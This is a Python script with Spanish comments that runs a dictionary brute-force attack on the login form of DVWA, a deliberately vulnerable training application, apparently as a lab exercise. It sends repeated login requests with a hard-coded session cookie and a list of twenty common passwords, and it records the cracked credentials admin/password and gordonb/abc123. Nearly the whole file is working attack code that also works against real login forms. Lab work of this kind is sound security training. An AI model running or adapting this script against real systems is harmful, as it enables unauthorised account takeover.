# ========================================
# SCRIPT DE FUERZA BRUTA EN PYTHON
# ========================================
# Este script realiza un ataque de fuerza bruta
# contra el formulario Brute Force de DVWA.
#
# Uso:
#   python3 brute_force.py
#
# Requisitos:
#   pip install requests
# ========================================

import requests

# ========================================
# CONFIGURACIÓN
# ========================================
url = "http://172.17.208.1:4280/vulnerabilities/brute/"

# Cookie de sesión (obtenida del navegador)
cookies = {
    "PHPSESSID": "cdb7525132853f92383a9fa19e4430b9",
    "security": "low"
}

# Usuario a atacar (cambiar por "gordonb" para el segundo ataque)
username = "admin"

# Diccionario de contraseñas comunes
passwords = [
    "password", "123456", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "696969", "shadow", "master", "666666"
]

# ========================================
# CABECERA DE INICIO
# ========================================
print(f"[*] Iniciando ataque de fuerza bruta contra {username}")
print(f"[*] Total de contraseñas a probar: {len(passwords)}")
print("-" * 50)

# ========================================
# BUCLE DE ATAQUE
# ========================================
for password in passwords:
    # Parámetros del formulario
    params = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    # Enviar solicitud GET con los parámetros y cookies
    response = requests.get(url, params=params, cookies=cookies)

    # Verificar si el login fue exitoso
    if "Welcome to the password protected area" in response.text:
        print(f"[+] ¡CONTRASEÑA ENCONTRADA! {username}:{password}")
        break
    else:
        print(f"[-] Falló: {password}")

# ========================================
# CABECERA DE CIERRE
# ========================================
print("-" * 50)
print("[*] Ataque finalizado")

# ========================================
# RESULTADOS OBTENIDOS:
# - admin / password (encontrado en el intento 1)
# - gordonb / abc123 (encontrado en el intento 13)
# ========================================
